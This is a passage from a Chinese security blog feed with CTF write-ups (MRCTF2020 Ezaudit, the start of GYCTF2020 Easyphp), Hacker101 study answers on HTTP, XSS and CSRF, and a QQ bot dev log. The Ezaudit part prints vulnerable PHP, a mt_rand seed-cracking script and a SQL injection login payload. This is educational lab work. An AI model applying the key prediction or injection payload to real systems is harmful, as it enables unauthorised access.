<span class="token punctuation">&#123;</span>        <span class="token comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'*************'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'************'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span> <span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span>            <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">,</span> <span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// genarate public_key</span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//genarate private_key</span><span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看后面给了公钥，要算出私钥，而是随机种子没有重置，所以先尝试php随机爆破</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-MRCTF2020-Ezaudit/image-20210810124035931.png"></p><p>跑出来了，验证一下试试</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1775196155</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">private_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php5.2.17,公钥验证成功</p><p>生成下私钥为</p><pre class="line-numbers language-none"><code class="language-none">XuNhoueCDCGc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>php5之后的随机种子每次进行mt_rand都会进行重置，所以需要顺着程序思路，设置好初始随机种子，先生成公钥，再生成私钥。不可直接上来生成私钥。</p></blockquote><p>然后sql注入下，结束</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;7f12c5f3-f664-43fb-9cee-48361320f1d1.node4.buuoj.cn:81&#x2F;login.phpPOST:Private_key&#x3D;XuNhoueCDCGc&amp;login&#x3D;登录&amp;password&#x3D;&#39;or&#39;1&#39;&#x3D;&#39;1&amp;username&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ机器人插件:第七史诗wiki</title>
      <link href="/p/4034348205.html"/>
      <url>/p/4034348205.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有了之前的经验，这个写起来就很快了。</p><h2 id="开发日志"><a href="#开发日志" class="headerlink" title="开发日志"></a>开发日志</h2><h3 id="2021年8月10日00-55-31"><a href="#2021年8月10日00-55-31" class="headerlink" title="2021年8月10日00:55:31"></a>2021年8月10日00:55:31</h3><p>基本处理完了。上线测试，收工。</p><h3 id="2021年8月10日00-14-28"><a href="#2021年8月10日00-14-28" class="headerlink" title="2021年8月10日00:14:28"></a>2021年8月10日00:14:28</h3><p>给数据库弄了个触发器记录更新时间，方便机器人读取已经后续查看。</p><h3 id="2021年8月9日23-25-50"><a href="#2021年8月9日23-25-50" class="headerlink" title="2021年8月9日23:25:50"></a>2021年8月9日23:25:50</h3><p>基本的人机交互逻辑整好了，还加了个自动同意好友和加群申请，接下来继续优化下交互逻辑吧。</p><h3 id="2021年8月9日17-57-50"><a href="#2021年8月9日17-57-50" class="headerlink" title="2021年8月9日17:57:50"></a>2021年8月9日17:57:50</h3><p>OK，wiki上的数据都扒完了，beautifulsoup真好使啊，接下来就是放到数据库里了。</p><p>还是先写入到excel里，方便日后修改。</p><h3 id="2021年8月9日11-30-05"><a href="#2021年8月9日11-30-05" class="headerlink" title="2021年8月9日11:30:05"></a>2021年8月9日11:30:05</h3><p>无语，一觉醒来，用火狐复制xpath路径，和chrome结果也一样了，真无语。还是老老实实用bs4吧。</p><h3 id="2021年8月9日00-02-39"><a href="#2021年8月9日00-02-39" class="headerlink" title="2021年8月9日00:02:39"></a>2021年8月9日00:02:39</h3><p>首先是扒wiki数据，谷歌浏览器不行啊，会自动补足什么，xpath路径给的不对。edge也是如此，换了火狐，竟然可以了，很久没用火狐了，这玩意手感还挺好。</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> nonebot2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hack101]THE WEB IN DEPTH</title>
      <link href="/p/3674367581.html"/>
      <url>/p/3674367581.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>In this session we’ll talk about how the web works from a security perspective.</p><p>在这节课我们将讨论从安全角度触发web服务如何工作的问题。</p><p><strong>What you’ll learn</strong></p><ul><li>HTTP basics</li><li>Cookie security</li><li>HTML parsing</li><li>MIME sniffing</li><li>Encoding sniffing</li><li>Same-Origin Policy</li><li>CSRF (Cross-Site Request Forgery)</li></ul></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>1.http报文的结构是什么？（1分）</strong></p><p><img src="/../images/hacker101-THE-WEB-IN-DEPTH/22901708-0141fed962448a31.png"></p><p><strong>2.什么是crlf？在http报文的哪个位置。（1分）</strong></p><p>回车换行，每行末位</p><p><strong>3.解释下这几个头的含义（5分）</strong></p><p>HOST:请求主机</p><p>Accept:表示客户端可接受哪种MIME类型，指定web服务是用json或者xml输出。</p><p>Cookie:给服务器传送cookie</p><p>Referer:来源页(HTTPS情况下不会传递)</p><p>Authorization:设置身份验证的凭证</p><p><strong>4.cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（3分）</strong></p><p>以键值对的形式临时存在。为域名设置的cookie，子域名也可读。子域名只可写自身的cookie。</p><p>Secure:限制只有通过https访问时才能传递cookie</p><p>httponly:阻止JavaScript读取cookie，可防xss攻击</p><p><strong>5.简述本视频提到的xss绕过web防火墙的方案（5分）</strong></p><p>用UTF-7/UTF-32编码payload</p><p><strong>6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）</strong></p><p>通过解析文件的内容，来猜测MIME类型的格式。有浏览器嗅探和客户端嗅探。客户端嗅探可用来判断浏览器为什么浏览器。</p><p>有些MIME类型是可执行类型，可以通过混淆MIME嗅探算法来执行XSS。</p><p>防止内容嗅探。</p><p><strong>7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？</strong></p><p>协议域名端口三者相同。</p><p>通过XHR连接域名和跨独立的框架/窗口进行访问。</p><p>容易造成XSS,CSRF攻击。</p><p><strong>8.csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？</strong></p><p>跨站请求伪造。</p><p>验证token，验证HTTP请求的Referer，还有验证XHR里的自定义header。</p><p>没有对请求来源进行验证/过滤。</p><p><strong>附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）</strong></p><p>SSTI</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 英语学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hacker101]A STARTERS GUIDE TO PENTESTING WITH OWASP</title>
      <link href="/p/960623103.html"/>
      <url>/p/960623103.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><blockquote><p>What is OWASP and what is the OWASP Top 10? Quick review of top 10 categories and types of vulnerabilities. Concludes with a detailed testing guide walkthrough.</p><p>什么是OWASP，OWASP中的TOP10又是什么？快速回顾下TOP10的分类以及漏洞类型，最后给出一个详细的测试指南演练。</p></blockquote><p><strong>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）</strong></p><p>Injection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Using Components with Known Vulnerabilities, Insufficient Logging &amp; Monitoring</p><p>常见程度</p><p><strong>2.请翻译一下credential stuffing（1分）</strong></p><p>撞库</p><p><strong>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）</strong></p><p>因为这可以让攻击者进一步攻击系统，保持持久的连接，转而篡改、提取、破坏数据。</p><p>很多研究表明超过200天以上的违规攻击，都是由内部的日志记录引起的。</p><p><strong>4.请翻阅一下<em>owasp testing guide</em>，以及<em>owasp testing guide check-list</em>，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）</strong></p><p>大致浏览看check-list，跟着guide中的具体操作去尝试，不用担心记不下所有漏洞，多做笔记多回顾就好。</p><p><strong>5.You are only as good as you notes. You are only as good as things you can refer to. 结合这两句话谈谈你的感想。（2分）</strong></p><p>多做笔记，好记性不如烂笔头，不要好高骛远，把握当下能掌握的才是最重要的。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 英语学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hacker101]INTRODUCTION</title>
      <link href="/p/84257377.html"/>
      <url>/p/84257377.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.hacker101.com/sessions/introduction.html">https://www.hacker101.com/sessions/introduction.html</a></p><blockquote><p>In this session we talk about the class and introduce the instructor, Cody Brocious, then jump into the mind of a breaker and talk about how you can take the things you learn in this class and apply them to real situations.</p><p>在这个章节我们将讨论课程相关的内容，介绍下导师Cody Brocious，然后以一个breaker的思维去讨论你在课程中学到的东西该如何去做，如何应用到真实环境。</p><p><strong>What you’ll learn</strong></p><ul><li>Required tools 所需要的工具</li><li>Thinking like a breaker 像breaker一样思考</li><li>Attacker-defender imbalance 攻防失衡</li><li>Lightweight threat assessment and prioritization 轻度风险评估和优先级</li><li>How to write good bug reports 如何写一个优雅的bug报告</li><li>Reflected XSS (Cross-Site Scripting) XSS反射</li></ul></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）</strong></p><p>Burpsuite：允许你监视包括HTTP/HTTPS数据流，可以中途修改或重发数据包。</p><p>Firefox浏览器：可以设置代理而避免系统代理的诸多问题。</p><p><strong>2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）</strong></p><p>先发制人。</p><p>按下最关键的按钮去查看反馈。如果不理解这个程序在做什么/为什么，就很难去找到方法去渗透。</p><p>漏洞是潜藏在程序流程之中的，所以挖掘漏洞的前提是把我程序脉络。</p><p><strong>3.审计以下代码：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span> <span class="token string">' name '</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>echo <span class="token string">"&lt;h1>Hello &#123;$_GET['name']&#125; !&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token operator">></span>Enter your name<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"input"</span> name<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">" submit"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>本段代码涉及到客户端，服务端以及通信协议。</p><p>运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释</p><p>通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET 运行在服务端的代码为php，由php核心负责解释。</p><p>用户端与服务端通过HTTP通信协议进行交互。</p></blockquote><p>**那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分） **</p><p>客户端：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter your name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>服务端：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">' name '</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span> !&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**客户端是通过传递什么参数来控制服务端代码的？（1分） **</p><p>GET参数</p><p><strong>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）</strong></p><p>可以任意执行JavaScript/HTML代码，造成xss漏洞。</p><p>属于反射型，恶意代码未被服务器存储，需要通过GET/POST方式才可触发。</p><p><strong>4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）</strong></p><p>找on事件、img标签等带有xss漏洞的地方，写入恶意代码，获取敏感信息，入cookie/session</p><p>用户可换带有XSS Auditor的谷歌浏览器，管理人员则需要加强过滤。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 英语学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GYCTF2020]Easyphp</title>
      <link href="/p/3540088970.html"/>
      <url>/p/3540088970.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化字符串逃逸]</p><p>十分复杂且经典的例题，需要多回顾。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804163917142.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便打，提示用户不存在</p><p>输入admin，提示密码错误，那么用户名应该就是admin了，先爆破一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804164308537.png"></p><p>提示被检测到了，那可能是sql注入。</p><p>老规矩，fuzz一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804170802180.png"></p><p>随手试了试<a href="http://www.zip,得,源码泄漏/">www.zip，得，源码泄漏</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804204402692.png"></p><p>可见只要登录成功，就能拿flag</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>lib.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span 